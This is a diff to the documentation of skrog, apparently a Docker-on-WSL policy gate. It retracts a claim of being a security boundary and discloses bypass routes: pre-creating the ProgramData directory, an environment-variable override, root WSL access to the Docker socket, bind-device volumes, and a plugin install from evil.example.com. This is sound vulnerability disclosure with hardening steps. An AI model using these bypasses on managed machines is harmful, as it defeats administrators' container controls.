@@ -17,7 +17,7 @@ Rules come from two files:
 
 | | Where | Who can write it |
 | --- | --- | --- |
-| **Machine** | `%ProgramData%\skrog\policy.yaml` | administrators |
+| **Machine** | `%ProgramData%\skrog\policy.yaml` | whoever the directory's ACL allows — see [what it is not](#what-it-is-not) |
 | **You** | `policy.yaml` in the state dir (`skrog policy show` prints the path) | you |
 
 They merge with one rule: **the user layer may only tighten.** You can forbid
@@ -25,7 +25,7 @@ more than the machine does. You cannot permit anything it forbids.
 
 ```
 $ skrog policy show
-machine rules: C:\ProgramData\skrog\policy.yaml  (administrator-writable; you cannot loosen these)
+machine rules: C:\ProgramData\skrog\policy.yaml  (deployed machine-wide; you cannot loosen these)
   deny --privileged
   bind mounts only from: C:\work
 
@@ -67,16 +67,33 @@ A tightening step never produces an *empty* allow-list, because empty means
 machine file, or uninstall Skrog. Nothing here survives someone who owns the
 box outright.
 
-**It IS a boundary against a standard user**, which is the actual
-configuration of a managed corporate laptop. A standard user cannot write to
-`%ProgramData%\skrog`, cannot loosen what is there, and cannot make `skrog
-policy show` lie about it. On a machine with no machine-wide file — a personal
-laptop — the original caveat stands in full: the rules are yours, you can edit
-them, and this catches mistakes rather than adversaries.
+**Not a boundary against a standard user either.** This section used to claim
+the opposite — that a standard user "cannot write to `%ProgramData%\skrog`,
+cannot loosen what is there, and cannot make `skrog policy show` lie about
+it." That was wrong on every clause, and it is the kind of wrong that matters,
+because it is the sentence a security team would have relied on:
 
-**Not a rule language.** No Rego, no expressions. The vocabulary is small and
-fixed so a reader can tell at a glance what is forbidden — which is most of
-the value of writing a policy down.
+- **The directory is not administrator-only by default.** `C:\ProgramData`
+  ships with `BUILTIN\Users:(CI)(WD,AD)` and `CREATOR OWNER:(OI)(CI)(IO)(F)`,
+  so on any machine where an administrator has not already created
+  `ProgramData\skrog`, a standard user can create it first and own it outright.
+  Skrog does not check the owner or the ACL before reading the file.
+- **The location can be redirected.** `SKROG_MACHINE_POLICY_DIR` overrides it,
+  and the supervisor runs as the ordinary user, who owns their own environment
+  block. `setx` is enough.
+- **The gate is not the only route to the engine.** The distro is registered in
+  the user's own WSL installation, so `wsl -d <distro> -u root` reaches
+  `/var/run/docker.sock` with nothing in the way. `skrog proxy
+  --no-path-translation` serves the pipe with the HTTP layer, gate included,
+  switched off. `skrog wsl-integrate` shares the socket at mode `0666`.
+
+What the machine layer honestly is: **tamper-evident fleet configuration,
+enforced at the pipe.** It stops a user from casually loosening the rules by
+editing their own `policy.yaml` — which is the realistic accident on a managed
+laptop — and `skrog policy show` tells you what is in force. It does not stop
+someone who sets out to get around it. Treat it as configuration management,
+not as access control. The tracking issue for closing the gaps above is
+[#418](https://github.com/wslkit/skrog/issues/418).
 
 **Not a rule language.** No Rego, no expressions. The vocabulary is small and
 fixed so a reader can tell at a glance what is forbidden — which is most of
@@ -123,7 +140,15 @@ would be trivially bypassed.
 **`allow-bind-sources` matches path prefixes at a boundary.** `C:\work` allows
 `C:\work\proj` but not `C:\workshop`. Case and separators do not matter, so
 `c:/work` is the same root. **Named volumes are not binds** — `-v myvol:/data`
-has no host path to restrict and is never denied by this rule.
+carries only a name at create time, so this rule does not apply to it.
+
+> That is a gap, not just a scope note. A `local`-driver volume *can* name a
+> host path — `docker volume create -o type=none -o o=bind -o device=/mnt/c/...`
+> — and `POST /volumes/create` is not judged at all, so a volume made that way
+> reaches a directory `allow-bind-sources` would have refused. Tracked as
+> [#419](https://github.com/wslkit/skrog/issues/419). Until it is closed, read
+> this rule as covering `-v <hostpath>:<target>`, not as covering every route
+> to a host directory.
 
 **`allow-registries` blocks Docker Hub unless you list it.** Docker's own rule
 is that the first component of an image reference is a registry only if it
@@ -198,6 +223,21 @@ supplies the `allow-registries` that makes it bite. That is the intended
 outcome — the administrator said "no unattributable builds where images are
 restricted", and they are.
 
+**Plugins and swarm services.** `POST /plugins/pull` and the swarm/service
+endpoints carry no attributable image reference either, and they are refused
+only when `deny-unattributable-builds` is on — which is off by default. So with
+a plain `allow-registries`, `docker plugin install evil.example.com/p` is
+allowed, and a Docker plugin gets host device and mount access: a worse outcome
+than the build hole the default was chosen to tolerate. Tracked as
+[#420](https://github.com/wslkit/skrog/issues/420); set
+`deny-unattributable-builds` if this matters to you today.
+
+**A registry mirror.** `skrog cache enable --upstream <url>` wires
+`registry-mirrors` into the engine, and the upstream is not checked against
+`allow-registries` ([#421](https://github.com/wslkit/skrog/issues/421)). The
+image *reference* is unchanged, so the rule passes; the bytes come from
+wherever the mirror points.
+
 **The network.** This is admission control at the Docker API. A running
 container can reach any registry it likes, and `docker load` plus `docker tag`
 will launder an image past a reference-based rule
@@ -268,14 +308,33 @@ your golden-image script. `contrib/` already has
 
 ```powershell
 # elevated
-New-Item -ItemType Directory -Force "$env:ProgramData\skrog" | Out-Null
-Set-Content "$env:ProgramData\skrog\policy.yaml" @'
+$dir = "$env:ProgramData\skrog"
+New-Item -ItemType Directory -Force $dir | Out-Null
+
+# Set the ACL explicitly. ProgramData's default gives Users (CI)(WD,AD) and
+# CREATOR OWNER full control of what they create, so a directory that skrog
+# or a user created first is NOT administrator-only -- and skrog does not
+# check (#418). Deploy this before anyone runs skrog on the machine.
+icacls $dir /inheritance:r `
+  /grant "*S-1-5-18:(OI)(CI)F" `
+  /grant "*S-1-5-32-544:(OI)(CI)F" `
+  /grant "*S-1-5-32-545:(OI)(CI)RX" | Out-Null
+$acl = Get-Acl $dir
+$acl.SetOwner([System.Security.Principal.SecurityIdentifier]"S-1-5-32-544")
+Set-Acl $dir $acl
+
+Set-Content "$dir\policy.yaml" @'
 deny-privileged: true
 deny-host-namespaces: true
 allow-registries:
   - registry.example.com
 '@
 ```
+
+The SIDs are used rather than names so the snippet works on a non-English
+Windows: `S-1-5-18` is SYSTEM, `S-1-5-32-544` Administrators, `S-1-5-32-545`
+Users (read + execute, which is what every user needs to have the rules
+applied to them).
 
 Check it before you ship it to a fleet — `skrog policy check` validates a file,
 and `skrog policy test` judges a real request against the *effective* rules:
@@ -298,9 +357,22 @@ against a real domain would be worse than not shipping one.
 
 ## Scope today
 
-Only `POST /containers/create` is judged, which is where `--privileged`,
-capabilities, namespaces, binds and the image reference all arrive. Resource
-caps on an unset container — the one *mutating* rule in the original
-proposal — are deliberately not implemented yet: mutating a user's request
+Judged: `POST /containers/create` (where `--privileged`, capabilities,
+namespaces, binds and the image reference all arrive), `POST /images/create`
+(pull) and `POST /images/{name}/push` — see the rule table above for which
+rule applies where. With `deny-unattributable-builds` set, the build endpoints
+(`/build`, `/session`, `/grpc`) and the other calls that carry no attributable
+image reference are refused too.
+
+Not judged: `POST /volumes/create`. A `local`-driver volume created with
+`-o type=none -o o=bind -o device=<path>` does have a host path, and it is not
+checked against `allow-bind-sources`
+([#419](https://github.com/wslkit/skrog/issues/419)). `POST /plugins/pull` and
+the swarm/service endpoints are only refused when
+`deny-unattributable-builds` is on, which is off by default
+([#420](https://github.com/wslkit/skrog/issues/420)).
+
+Resource caps on an unset container — the one *mutating* rule in the original
+proposal — are deliberately not implemented: mutating a user's request
 silently deserves its own review, and every rule here refuses rather than
 edits.
